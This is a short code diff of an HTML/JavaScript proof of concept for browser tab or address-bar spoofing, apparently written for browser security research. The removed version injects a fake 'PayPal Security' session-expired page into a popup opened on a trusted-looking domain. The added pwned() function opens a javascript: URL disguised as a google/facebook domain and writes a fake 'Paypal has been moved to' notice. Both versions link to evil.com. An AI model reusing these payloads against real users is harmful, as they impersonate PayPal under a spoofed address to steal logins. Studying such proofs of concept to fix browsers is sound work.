@@ -1,38 +1,13 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tap to Continue</title>
-</head>
-<body>
-  <h2>⚠️ Security Verification</h2>
-  <button id="go">Tap to proceed</button>
+<script>
 
-  <script>
-    document.getElementById("go").addEventListener("click", () => {
-      // Step 1: open a trusted domain in a named tab
-      const popup = window.open("https://legitsite.com", "phishTab");
 
-      if (!popup) {
-        alert("Enable pop-ups to test.");
-        return;
-      }
+function pwned() {
 
-      // Step 2: inject phishing content
-      setTimeout(() => {
-        try {
-          popup.document.write(`
-            <h1>⚠️ PayPal Notice</h1>
-            <p>Your session has expired. Please <a href="https://evil.com">sign in again</a>.</p>
-            <iframe src="https://permission.site" style="width:100%;height:50vh;border:none;"></iframe>
-            <button onclick="document.documentElement.requestFullscreen()">Start Fullscreen</button>
-          `);
-          popup.document.title = "PayPal Security";
-        } catch (e) {
-          console.warn("Cross-origin block prevented injection.");
-        }
-      }, 400);
-    });
-  </script>
-</body>
-</html>
+
+var t = window.open('javascript:#verylongurl.google.facebook.com');
+
+t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
+
+t.stop();
+
+}
